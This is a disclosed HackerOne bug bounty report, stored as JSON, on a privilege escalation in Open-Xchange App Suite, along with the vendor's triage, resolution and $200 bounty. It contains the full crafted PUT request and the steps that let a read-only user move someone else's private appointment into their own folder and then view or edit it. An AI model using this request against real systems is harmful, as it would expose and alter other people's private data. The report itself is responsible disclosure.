{"id":220874,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMjA4NzQ=","url":"https://hackerone.com/reports/220874","title":"Critical : View/Edit access to private appointments of calendar folder by read only user (Vertical privilege escalation)","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2017-04-13T21:56:50.644Z","submitted_at":"2017-04-13T21:56:50.644Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"indoappsec","url":"/indoappsec","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/QUAjqUf576QNBhxg691WB8YG/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8906,"url":"https://hackerone.com/open-xchange","handle":"open-xchange","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Open-Xchange","twitter_handle":"openxchange","website":"https://www.open-xchange.com/","about":"Messaging, collaboration and office productivity software for service providers"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-08-17T20:45:02.294Z","bug_reporter_agreed_on_going_public_at":"2017-07-18T20:44:53.023Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi Team,\n\nDescription : Read only user of calendar folder shouldn't be able access any private appointments. I have found a move calendar folder request which is working for read only user. Once Attacker moves the appointment to his folder , then he can Access private appointments.\n\nVulnerable HTTP request : \n\nPUT /appsuite/api/multiple?session=[session_token] HTTP/1.1\nHost: sandbox.open-xchange.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:52.0) Gecko/20100101 Firefox/52.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nContent-Type: text/javascript; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nReferer: https://sandbox.open-xchange.com/appsuite/\nContent-Length: 113\nCookie: [cookie_values]\nConnection: close\n\n[{\"action\":\"update\",\"id\":[appointmentID],\"folder\":[Current_Folder_ID],\"timestamp\":1492114513233,\"module\":\"calendar\",\"data\":{\"folder_id\":\"[Target_folder_ID]\"}}]\n\nHere you need to keep the Current_Folder_ID and Target_folder_ID of you own calendars where you are admin . you just need to change appointmentID to private appointmentID where you are read only user. This request will be accepted by server and appointment will be added into your target calendar folderID. Once appointment is added into your folder you will be able to View all it's content and Edit it. \n\nActual problem  : When you move the appointment , the appointment is copied with same appointmenID which leads to this attack . \n\nIssues : \n1.You can view appointment it's attachments and members etc.\n2.You can change the status of appointment.\n3.You can edit the details of calendar. \n4.You can move the calendar .\n\nLet me know if you require Steps or Video POC for this issue. \n\nBest Regards !\nVijay Kumar ","vulnerability_information_html":"\u003cp\u003eHi Team,\u003c/p\u003e\n\n\u003cp\u003eDescription : Read only user of calendar folder shouldn\u0026#39;t be able access any private appointments. I have found a move calendar folder request which is working for read only user. Once Attacker moves the appointment to his folder , then he can Access private appointments.\u003c/p\u003e\n\n\u003cp\u003eVulnerable HTTP request : \u003c/p\u003e\n\n\u003cp\u003ePUT /appsuite/api/multiple?session=[session_token] HTTP/1.1\u003cbr\u003e\nHost: sandbox.open-xchange.com\u003cbr\u003e\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:52.0) Gecko/20100101 Firefox/52.0\u003cbr\u003e\nAccept: application/json, text/javascript, \u003cem\u003e/\u003c/em\u003e; q=0.01\u003cbr\u003e\nAccept-Language: en-US,en;q=0.5\u003cbr\u003e\nContent-Type: text/javascript; charset=UTF-8\u003cbr\u003e\nX-Requested-With: XMLHttpRequest\u003cbr\u003e\nReferer: \u003ca title=\"https://sandbox.open-xchange.com/appsuite/\" href=\"/redirect?url=https%3A%2F%2Fsandbox.open-xchange.com%2Fappsuite%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://sandbox.open-xchange.com/appsuite/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nContent-Length: 113\u003cbr\u003e\nCookie: [cookie_values]\u003cbr\u003e\nConnection: close\u003c/p\u003e\n\n\u003cp\u003e[{\u0026quot;action\u0026quot;:\u0026quot;update\u0026quot;,\u0026quot;id\u0026quot;:[appointmentID],\u0026quot;folder\u0026quot;:[Current_Folder_ID],\u0026quot;timestamp\u0026quot;:1492114513233,\u0026quot;module\u0026quot;:\u0026quot;calendar\u0026quot;,\u0026quot;data\u0026quot;:{\u0026quot;folder_id\u0026quot;:\u0026quot;[Target_folder_ID]\u0026quot;}}]\u003c/p\u003e\n\n\u003cp\u003eHere you need to keep the Current_Folder_ID and Target_folder_ID of you own calendars where you are admin . you just need to change appointmentID to private appointmentID where you are read only user. This request will be accepted by server and appointment will be added into your target calendar folderID. Once appointment is added into your folder you will be able to View all it\u0026#39;s content and Edit it. \u003c/p\u003e\n\n\u003cp\u003eActual problem  : When you move the appointment , the appointment is copied with same appointmenID which leads to this attack . \u003c/p\u003e\n\n\u003cp\u003eIssues : \u003cbr\u003e\n1.You can view appointment it\u0026#39;s attachments and members etc.\u003cbr\u003e\n2.You can change the status of appointment.\u003cbr\u003e\n3.You can edit the details of calendar. \u003cbr\u003e\n4.You can move the calendar .\u003c/p\u003e\n\n\u003cp\u003eLet me know if you require Steps or Video POC for this issue. \u003c/p\u003e\n\n\u003cp\u003eBest Regards !\u003cbr\u003e\nVijay Kumar \u003c/p\u003e\n","bounty_amount":"200.0","formatted_bounty":"$200","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-08-17T20:44:53.070Z","allow_singular_disclosure_after":-106215311.74706939,"singular_disclosure_allowed":true,"vote_count":3,"voters":["eveeez","indoappsec","spetr0x"],"severity":{"rating":"critical","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1610779,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Since the issue is little difficult to reproduce , I am providing Video POC for this issue .\n\nLink : https://youtu.be/pgIAS6OO-fA\n(Private Video)\n\nLet me know if you need any other help from my side.\n\nBest Regards !\nVijay Kumar ","markdown_message":"\u003cp\u003eSince the issue is little difficult to reproduce , I am providing Video POC for this issue .\u003c/p\u003e\n\n\u003cp\u003eLink : \u003ca title=\"https://youtu.be/pgIAS6OO-fA\" href=\"/redirect?url=https%3A%2F%2Fyoutu.be%2FpgIAS6OO-fA\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://youtu.be/pgIAS6OO-fA\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n(Private Video)\u003c/p\u003e\n\n\u003cp\u003eLet me know if you need any other help from my side.\u003c/p\u003e\n\n\u003cp\u003eBest Regards !\u003cbr\u003e\nVijay Kumar \u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-13T22:28:51.925Z","updated_at":"2017-04-13T22:28:51.925Z","actor":{"username":"indoappsec","cleared":true,"url":"/indoappsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QUAjqUf576QNBhxg691WB8YG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1620202,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the report, we're evaluating the issue.","markdown_message":"\u003cp\u003eThanks for the report, we\u0026#39;re evaluating the issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-19T06:41:08.696Z","updated_at":"2017-04-19T06:41:08.696Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1620478,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2017-04-19T09:45:07.320Z","updated_at":"2017-04-19T09:45:07.320Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1620569,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for reporting this vulnerability to us. We take your feedback very serious and started the process of resolving and delivering a solution to our users. Please note that we will take care about public disclosure of the vulnerability and give our users a chance to update to a fixed version before. Therefor, please handle this finding with discretion until we publicly disclosed it.\n\nWe'll discuss the matter of bounty for this finding soon and will update you shortly. Would you like to be included in our advisories \"researcher credits\"?","markdown_message":"\u003cp\u003eThanks for reporting this vulnerability to us. We take your feedback very serious and started the process of resolving and delivering a solution to our users. Please note that we will take care about public disclosure of the vulnerability and give our users a chance to update to a fixed version before. Therefor, please handle this finding with discretion until we publicly disclosed it.\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;ll discuss the matter of bounty for this finding soon and will update you shortly. Would you like to be included in our advisories \u0026quot;researcher credits\u0026quot;?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-19T10:17:21.361Z","updated_at":"2017-04-19T10:17:21.361Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1642627,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Closing as resolved since all necessary information got provided. We'll release a patch for this soon.","markdown_message":"\u003cp\u003eClosing as resolved since all necessary information got provided. We\u0026#39;ll release a patch for this soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-28T14:11:32.342Z","updated_at":"2017-04-28T14:11:32.342Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"indoappsec","url":"/indoappsec"},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1642629,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-04-28T14:11:41.711Z","updated_at":"2017-04-28T14:11:41.711Z","actor":{"url":"/open-xchange","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Open-Xchange"}},"bounty_amount":"200.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"open-xchange","collaborator":{"username":"indoappsec","url":"/indoappsec"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1847978,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Can we disclose this please ?","markdown_message":"\u003cp\u003eCan we disclose this please ?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-18T20:44:53.044Z","updated_at":"2017-07-18T20:44:53.044Z","first_to_agree":true,"actor":{"username":"indoappsec","cleared":true,"url":"/indoappsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QUAjqUf576QNBhxg691WB8YG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1937462,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-08-17T20:45:02.333Z","updated_at":"2017-08-17T20:45:02.333Z","actor":{"url":"/open-xchange","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Open-Xchange"}},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}